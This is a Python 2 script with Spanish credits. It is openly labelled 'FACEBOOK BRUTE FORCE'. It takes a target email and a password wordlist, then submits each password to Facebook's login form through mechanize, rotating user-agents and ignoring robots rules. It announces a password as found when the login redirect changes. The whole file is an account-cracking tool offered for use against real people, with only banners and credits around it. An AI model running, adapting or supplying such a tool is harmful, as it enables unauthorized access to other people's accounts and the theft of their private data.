#!/usr/bin/env python
# -*- coding: UTF-8 -*-
#NO ROBES SIN DAR CREDITOS A MR.0KING Y Desze No seas un BRC LZZZZZZZ
#Tool By: MR.0KING;
#SpanishV:Desze
#Instagram: @iDesze
#TRASNLATE&POWER BY Desze	
	
import os
import sys
import mechanize
import cookielib
import random 
import time

os.system('clear')

def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

if sys.platform == "linux" or sys.platform == "linux2":
     GL = "\033[96;1m" # Blue aqua
     BB = "\033[34;1m" # Blue light
     YY = "\033[33;1m" # Yellow light
     GG = "\033[32;1m" # Green light
     WW = "\033[0;1m"  # White light
     RR = "\033[31;1m" # Red light
     CC = "\033[36;1m" # Cyan light
     B = "\033[34m"    # Blue
     Y = "\033[33;1m"    # Yellow
     G = "\033[32m"    # Green
     W = "\033[0;1m"     # White
     R = "\033[31m"    # Red
     C = "\033[36;1m"    # Cyan
     rand = (BB,YY,GG,WW,RR,CC)
     P = random.choice(rand)
def cover():
    print """
    
    
    
    
     """
    runntek(GG+"            ...............Cargando...............")
    time.sleep(1)
    print " "
    print RR+ "                    FACEBOOK BRUTE FORCE\033[32;1m:"
    print RR+ "              ╭╮╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╭━━━┳╮╱╱╱╱╱╱╱╱╭╮"
    print RR+ "              ┃┃╱┃┃╱╱╱╱╱╱╱╱╱╱╱╱┃╭━╮┃┃╱╭╮╱╱╱╱╭╯╰╮"
    print RR+ "              ┃╰━╯┣╮╱╭┳━━┳━━┳━╮┃┃╱┃┃╰━╋╋━━┳━┻╮╭╯"
    print RR+ "              ┃╭━╮┃┃╱┃┃╭╮┃┃━┫╭╯┃┃╱┃┃╭╮┣┫┃━┫╭━┫┃"
    print RR+ "              ┃┃╱┃┃╰━╯┃╰╯┃┃━┫┃╱┃╰━╯┃╰╯┃┃┃━┫╰━┫╰╮"
    print RR+ "              ╰╯╱╰┻━╮╭┫╭━┻━━┻╯╱╰━━━┻━━┫┣━━┻━━┻━╯"
    print RR+ "              ╱╱╱╱╭━╯┃┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╭╯┃ V:1.0"
    print RR+ "              ╱╱╱╱╰━━╯╰╯╱╱╱╱╱╱╱╱╱╱╱╱╱╰━╯ ᴮʸ⠘ Desze"
    print RR+ "                                         "
    print " "
    time.sleep(5)
cover()

email = str(raw_input(Y+"  •HYPER OBJECT \033[31;1mEMAIL\033[92;1m: "))

passwordlist = str(raw_input(Y+"  •WORDLIST \033[31;1m[ pass.txt | 10m.txt]\033[92;1m: "))


#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck','Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060313 Firefox/1.5.0.1','Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8.0.11) Gecko/20070327 Ubuntu/dapper-security Firefox/1.5.0.11','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.9) Gecko/20071025 Firefox/1.5.0.9 (Debian-2.0.0.9-2)','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; KTXN B667489956A90245T1390849P1) like Gecko')]


def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

def main():
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        welcome()
        search()
        print " "
        runntek(RR+"  AVISO:")
        runntek(RR+"  Ninguna contraseña Coincide con la contraseña de la cuenta")
	runntek(RR+"  Crea tu propio diccionario personalizado de contraseñas ")
        time.sleep(1)
        print WW+34*"  -"
        kol()

def kol():
    nok = raw_input("Editar diccionario? \033[96;1m[y/n]: ")
    if nok == "y":
        print ("Escriba el diccionario que desee editar \033[92;1m[ nano pass.txt | 10m.txt] !")
        print WW+(41*"-")
        print GL+(" ")
        os.sys.exit()
    else:
        exit(0)
def brute(password):
        sys.stdout.write(GG+"\r[*]\033[97;1m {}\n".format(password))
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
        if log != login and (not 'login_attempt' in log):
                        print("\033[92;1m\n\n[*]\033[97;1m Contraseña encontrada \033[31;1m> \033[32;1m{}".format(password)) 
                        print " "
                        raw_input(WW+"PRECIONA ENTER PARA CONTINUAR.....")
                        sys.exit(1)


def search():
        global password
        passwords = open(passwordlist,"r")
        for password in passwords:
                passwords = password.replace("\n","")
                brute(password)


#welcome
def welcome():
        wel = GG+"""
                                CREDITS:    
                       Tool By: MR.0KING & Desze             
                        ──▄────▄▄▄▄▄▄▄────▄───
                        ─▀▀▄─▄█████████▄─▄▀▀──
                        ─────██─▀███▀─██──────
                        ───▄─▀████▀████▀─▄────
                        ─▀█────██▀█▀██────█▀──

                           \033[31;1mComenzando Ataque\033[92;1m
\033[1;0m
      """
        print wel
        print " "
        total = open(passwordlist,"r")
        total = total.readlines()
        print " "
        print GG+" [*] Objetivo : {}".format(email)
        print RR+" [*] Contraseñas :" , len(total),WW+ "Contraseñas a probar"
        print Y+" [*] Intentando acceder .....\n\n"

if __name__ == '__main__':
        main()
